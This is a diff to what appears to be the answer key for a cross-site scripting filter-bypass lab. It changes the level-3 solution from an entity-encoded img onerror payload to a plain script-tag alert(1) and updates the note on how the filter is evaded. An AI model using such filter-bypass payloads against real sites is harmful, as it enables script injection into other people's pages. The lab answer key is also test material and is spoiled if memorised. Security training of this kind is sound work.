@@ -21,10 +21,10 @@ Reflections with mutation/regex filters that can be bypassed.
 
 ### mutfilter-level3
 
-`/mutfilter/level3/?query=%3Cimg%20src=x%20&#x6f;nerror=alert(1)%3E`
+`/mutfilter/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `<img src=x &#x6f;nerror=alert(1)>`
-- context: `\bon\w` stripped from raw text; HTML-entity-encode the `o` so filter doesn't match, browser decodes
+- payload: `<script>alert(1)</script>`
+- context: on* attributes are rewritten to off*; a script tag needs no handler
 
 ### mutfilter-level4
 
